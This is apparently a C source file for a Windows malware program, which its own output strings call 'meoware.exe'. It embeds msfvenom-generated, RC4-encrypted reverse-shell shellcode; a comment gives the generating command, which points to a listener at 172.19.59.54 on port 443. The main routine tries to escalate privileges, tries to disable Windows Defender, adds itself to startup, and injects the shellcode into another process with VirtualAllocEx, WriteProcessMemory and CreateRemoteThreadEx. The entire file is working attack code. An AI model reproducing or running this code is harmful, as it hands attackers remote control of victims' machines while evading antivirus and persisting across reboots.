#include <stdio.h>
#include <windows.h>
#include "add_to_startup.h"
#include "priv_esc.h"
#include "disable_windef.h"
#include "find_pid.h"
//#include "dll_inj.h"

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

//msfvenom --platform windows --arch x64 EXITFUNC=thread -p windows/x64/shell/reverse_tcp_rc4 LHOST=172.19.59.54 LPORT=443 RC4PASSWORD=PASS EXITFUNC=thread -f c --var-name=ucReverseShell
unsigned char ucReverseShell[] =
"\xeb\x27\x5b\x53\x5f\xb0\x35\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\xed\x28\x74\x07\x80\x3e\x35\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x03\x13\x35\xff\x5b\x80\xf7\xf3\xfb\xcf"
"\x13\x03\x13\x42\x42\x42\x43\x51\x42\x4b\x22\xd1\x45\x66"
"\x5b\x88\x41\x63\x5b\x88\x41\x1b\x5b\x88\x41\x23\x5b\x88"
"\x61\x53\x5e\x32\xda\x4b\x1c\xb4\x59\x49\x5b\x32\xd3\xaf"
"\x2f\x62\x6f\x01\x3f\x23\x52\xc2\xda\x0e\x52\x02\xd2\xe1"
"\xfe\x51\x5b\x88\x41\x23\x98\x41\x2f\x4b\x12\xd3\x75\x82"
"\x6b\x1b\x18\x01\x52\x52\x1c\x86\x61\x03\x13\x03\x98\x83"
"\x9b\x03\x13\x03\x5b\x86\xd3\x77\x74\x4b\x12\xd3\x98\x4b"
"\x0b\x47\x98\x43\x33\x53\x5a\x02\xc3\xe0\x45\x4e\x22\xca"
"\x5b\xfc\xda\x42\x98\x37\x9b\x4b\x12\xd5\x5b\x32\xd3\x42"
"\xd2\xca\x1e\xaf\x52\x02\xd2\x3b\xf3\x76\xe2\x4f\x10\x4f"
"\x37\x0b\x56\x3a\xc2\x76\xcb\x5b\x57\x88\x53\x27\x5a\x02"
"\xc3\x65\x52\x88\x1f\x4b\x57\x88\x53\x1f\x5a\x02\xc3\x42"
"\x98\x07\x9b\x42\x4b\x4b\x12\xd3\x52\x5b\x4d\x5a\x49\x42"
"\x4b\x42\x4a\x42\x49\x4b\x90\xef\x33\x42\x41\xfc\xf3\x5b"
"\x52\x5a\x49\x4b\x98\x11\xfa\x48\xec\xfc\xec\x5e\x5a\xbd"
"\x64\x70\x21\x5c\x20\x31\x13\x03\x52\x55\x5a\x8a\xf5\x4b"
"\x92\xef\xb3\x02\x13\x03\x5a\x8a\xf6\x4a\xaf\x01\x13\x12"
"\x4f\xc3\xbb\x8c\x94\x42\x47\x4a\x9a\xe7\x5f\x8a\xe2\x42"
"\xa9\x4f\x64\x25\x14\xfc\xc6\x4f\x9a\xe9\x7b\x02\x12\x03"
"\x13\x5a\x52\xb9\x3a\x83\x78\x03\xec\xd6\x79\x09\x52\x5d"
"\x43\x53\x5e\x32\xda\x4e\x22\xc3\x5b\xfc\xd3\x4b\x9a\xc1"
"\x5b\xfc\xd3\x4b\x9a\xc2\x52\xb9\xf9\x0c\xcc\xe3\xec\xd6"
"\x5b\x8a\xd4\x69\x03\x42\x4b\x4f\x9a\xe1\x5b\x8a\xea\x42"
"\xa9\x9a\xb6\x77\x72\xfc\xc6\x86\xd3\x77\x19\x4a\xec\xcd"
"\x66\xe6\xfb\x1c\x12\x03\x13\x4b\x90\xef\x03\x4b\x9a\xe1"
"\x5e\x32\xda\x69\x17\x42\x4b\x4b\x9a\xfa\x52\xb9\x11\xda"
"\xdb\x5c\xec\xd6\x90\xfb\x13\x0c\x9d\x6e\x13\x03\x13\x4b"
"\x90\xc7\x33\x5d\x9a\xf5\x92\xf5\x49\x52\xaf\x81\x5f\x8e"
"\x8d\x03\x12\x03\x13\x69\x53\x42\x4a\x6b\x13\x13\x13\x03"
"\x52\x5b\x5b\x8a\xe1\x4b\x22\xca\x52\xb9\x4b\xa7\x40\xe6"
"\xec\xd6\x5b\x8e\x8b\x03\x12\x03\x13\x4a\x9a\xdc\x40\x55"
"\x43\x4e\x22\xca\x5a\x8a\xe3\x4b\x9a\xd9\x5b\x8a\xea\x42"
"\xa9\x01\xca\xcb\x4c\xfc\xc6\x4b\x90\xc7\x33\x80\xeb\x03"
"\x6e\x2b\x4b\x42\x44\x5a\x7b\x03\x53\x03\x13\x42\x4b\x69"
"\x13\x59\x52\xb9\x18\x2c\x1c\x33\xec\xd6\x44\x5a\x52\xb9"
"\x66\x6d\x5e\x62\xec\xd6\x5a\xfc\xdd\xea\x33\xfc\xec\xfc"
"\x5b\x02\xd0\x4b\x3a\xc5\x66\xb0\x5a\x8a\xed\x5c\x4a\x42"
"\x4a\x42\x45\xeb\x03\x03\x13\x03\x4f\x4e\x3c\xf5\x69\xe2"
"\xcb\x36\xa2\x3b\x73\x68\x41\x11\xd3\xe4\x4d\x4b\x22\xc3"
"\x5a\x8a\xeb\xa9\xed\xc3\x66\xf8\x5b\x32\xc8\x42\x11\x1f"
"\x13\x4b\x9a\xc1\x93\xe1\x1c\x01\x0f\x15\x52\x89\x07\x03"
"\x52\x85\x07\x1b\x52\x8b\x07\x03\xed\xc3\x66\xe0\x5b\x32"
"\xc8\xfd\xd3\x42\x11\x1f\x13\x42\x99\x17\x13\x42\x95\x17"
"\x0b\x42\x9b\x17\x13\x42\x11\x17\x0b\x42\x99\x17\x03\x42"
"\x23\x12\x5a\xfc\xd2\x4b\xec\xca\x66\xd8\x4c\x42\xec\xe4"
"\x4b\x69\x13\x5a\xa8\xe3\x0e\x29\x19\x42\x9a\xd9\xec\xd6"
"\xed\x28";

DWORD PID,TID= NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;



int main(int arcg,char* argv[]) {

	LARGE_INTEGER StartingTime, EndingTime, ElapsedMicroseconds;
	LARGE_INTEGER Frequency;

	QueryPerformanceFrequency(&Frequency);
	QueryPerformanceCounter(&StartingTime);

	/*
	AddToStartup();
	
	if (arcg < 2) { printf("%s usage : rogram.exe <PID>", e); 
	return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	*/
	PID = get_pid();

	priv_esc();
	printf(" %s trying to disable windows defender...\n",k);

	if (!dis_windef()) { printf("%s faild disable windows defender :(\n",e); }

	printf("%s starting main meoware.exe...\n",i);




	AddToStartup();

	printf("%s trying to open handle to process (%ld)\n", i, PID);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
	printf("%s got a handle to the process\n\\---0x%p\n",k,hProcess);

	if (hProcess == NULL) { printf("%s couldnt get a handle to process (%ld), error : %ld", e, PID, GetLastError());
	return EXIT_FAILURE;
	}

	rBuffer = VirtualAllocEx(hProcess,NULL,sizeof(ucReverseShell),(MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n",k,sizeof(ucReverseShell));

	
	WriteProcessMemory(hProcess,rBuffer,ucReverseShell,sizeof(ucReverseShell),NULL);
	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(ucReverseShell));

	hThread = CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL,0,0,&TID);

	if (hThread == NULL) {
	
		printf("%s faild to get a handle to the thread , error: %ld ", e,GetLastError());
		CloseHandle(hProcess);
		
		return EXIT_FAILURE;
	}




	QueryPerformanceCounter(&EndingTime);
	ElapsedMicroseconds.QuadPart = EndingTime.QuadPart - StartingTime.QuadPart;
	ElapsedMicroseconds.QuadPart *= 1000000;
	ElapsedMicroseconds.QuadPart /= Frequency.QuadPart;
	printf("%s got a handle to the thread (%ld), %lu micro Sec\n\\ ---0x%p\n ",k,TID,hThread,ElapsedMicroseconds);

	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished execution\n",k);

	printf("%s cleaning up\n",i);
	CloseHandle(hThread); 
	CloseHandle(hProcess);
	printf("%s finishd!\n", k);

	

	return EXIT_SUCCESS;

}